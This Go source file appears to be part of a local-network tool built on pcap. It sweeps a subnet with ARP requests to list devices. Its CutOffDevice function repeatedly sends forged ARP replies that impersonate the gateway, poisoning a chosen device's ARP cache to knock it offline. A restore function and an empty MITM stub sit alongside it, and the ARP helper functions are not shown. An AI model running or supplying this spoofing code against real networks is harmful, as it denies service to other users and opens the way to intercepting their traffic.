package networkscan

import (
	"bytes"
	"context"
	"fmt"
	"log"
	"net"
	"sort"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/pcap"
)

type Device struct {
	IP       net.IP
	MAC      net.HardwareAddr
	HOSTNAME []string
}

type NetworkScanner struct {
	handle    *pcap.Handle
	localIP   net.IP
	localMAC  net.HardwareAddr
	localNet  *net.IPNet
	ifaceName string
}

func NewNetworkScanner(ifaceName string) *NetworkScanner {
	if ifaceName == "" || ifaceName == "auto" {
		ifaceName = detectInterfaceName()
	}

	handle, err := pcap.OpenLive(ifaceName, 65536, true, pcap.BlockForever)
	if err != nil {
		log.Fatalf("Error opening device %s: %v", ifaceName, err)
	}

	iface, err := net.InterfaceByName(ifaceName)
	if err != nil {
		log.Fatalf("Error getting interface %s: %v", ifaceName, err)
	}

	localIP, localNet, err := ipv4Addr(iface)
	if err != nil {
		log.Fatalf("Error getting IPv4 address for interface %s: %v", ifaceName, err)
	}
	localMAC := iface.HardwareAddr

	return &NetworkScanner{
		handle:    handle,
		localIP:   localIP,
		localMAC:  localMAC,
		localNet:  localNet,
		ifaceName: ifaceName,
	}
}

func (ns *NetworkScanner) DefaultCIDR() string {
	if ns.localNet == nil {
		return ""
	}
	networkIP := ns.localNet.IP.Mask(ns.localNet.Mask)
	return (&net.IPNet{IP: networkIP, Mask: ns.localNet.Mask}).String()
}

func (ns *NetworkScanner) NetScan(targetNet string) []Device {
	_, ipNet, err := net.ParseCIDR(targetNet)
	if err != nil {
		log.Fatalf("Error parsing CIDR: %v", err)
	}
	fmt.Printf("Scanning network %s...\n", ipNet)

	done := make(chan bool)
	defer close(done)

	go func() {
		for ip := ipNet.IP.Mask(ipNet.Mask); ipNet.Contains(ip); IncrementIP(ip) {
			if ip.Equal(ns.localIP) {
				continue
			}
			go SendARPRequest(ns.handle, net.HardwareAddr{0, 0, 0, 0, 0, 0}, ns.localMAC, ns.localIP, ip)
			time.Sleep(250 * time.Millisecond)
		}
		time.Sleep(1 * time.Second)
		done <- true
	}()

	fmt.Println("Waiting for responses...")

	packetSource := gopacket.NewPacketSource(ns.handle, ns.handle.LinkType())
	devicesByIP := make(map[string]Device)

	for {
		select {
		case packet := <-packetSource.Packets():
			device := HandleARPPacket(packet)
			if device.IP != nil && device.MAC != nil {
				key := device.IP.String()
				if _, exists := devicesByIP[key]; !exists {
					devicesByIP[key] = device
					fmt.Printf("Discovered device: IP=%s, MAC=%s, HOSTNAME: %s\n", device.IP, device.MAC, device.HOSTNAME)
				}
			}
		case <-done:
			fmt.Println("Stopping packet capture after scan completion.")
			devices := make([]Device, 0, len(devicesByIP))
			for _, device := range devicesByIP {
				devices = append(devices, device)
			}
			sort.Slice(devices, func(i, j int) bool {
				return bytes.Compare(devices[i].IP, devices[j].IP) < 0
			})
			return devices
		}
	}
}

func (ns *NetworkScanner) ResolveDevice(ip net.IP) (*Device, bool) {
	if ip == nil {
		return nil, false
	}
	devices := ns.NetScan(ip.String() + "/32")
	for _, device := range devices {
		if device.IP != nil && device.IP.Equal(ip) {
			return &device, true
		}
	}
	return nil, false
}

func (ns *NetworkScanner) CutOffDevice(ctx context.Context, device Device, gateway string) error {
	gatewayIP := net.ParseIP(gateway).To4()
	if gatewayIP == nil {
		return fmt.Errorf("invalid gateway IP: %s", gateway)
	}
	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
			SendARPReply(ns.handle, device.MAC, device.IP, ns.localMAC, gatewayIP)
			time.Sleep(2 * time.Second)
		}
	}
}

func (ns *NetworkScanner) RestoreDevice(device Device, gateway string) error {
	gatewayIP := net.ParseIP(gateway).To4()
	if gatewayIP == nil {
		return fmt.Errorf("invalid gateway IP: %s", gateway)
	}
	gatewayDevice, ok := ns.ResolveDevice(gatewayIP)
	if !ok {
		return fmt.Errorf("unable to resolve gateway MAC for %s", gatewayIP.String())
	}
	for i := 0; i < 3; i++ {
		SendARPReply(ns.handle, device.MAC, device.IP, gatewayDevice.MAC, gatewayIP)
		time.Sleep(500 * time.Millisecond)
	}
	return nil
}

func MITM(device Device) {
}

func (ns *NetworkScanner) Close() {
	ns.handle.Close()
}

func detectInterfaceName() string {
	ifaces, err := net.Interfaces()
	if err != nil {
		log.Fatalf("Error listing interfaces: %v", err)
	}

	for _, iface := range ifaces {
		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
			continue
		}
		if ip, _, err := ipv4Addr(&iface); err == nil && ip != nil {
			return iface.Name
		}
	}

	log.Fatal("No suitable network interface with IPv4 address found")
	return ""
}

func ipv4Addr(iface *net.Interface) (net.IP, *net.IPNet, error) {
	addrs, err := iface.Addrs()
	if err != nil {
		return nil, nil, fmt.Errorf("error getting addresses for interface %s: %w", iface.Name, err)
	}
	for _, addr := range addrs {
		ipNet, ok := addr.(*net.IPNet)
		if !ok {
			continue
		}
		ip := ipNet.IP.To4()
		if ip != nil {
			return ip, &net.IPNet{IP: ip, Mask: ipNet.Mask}, nil
		}
	}
	return nil, nil, fmt.Errorf("no IPv4 address found for interface %s", iface.Name)
}
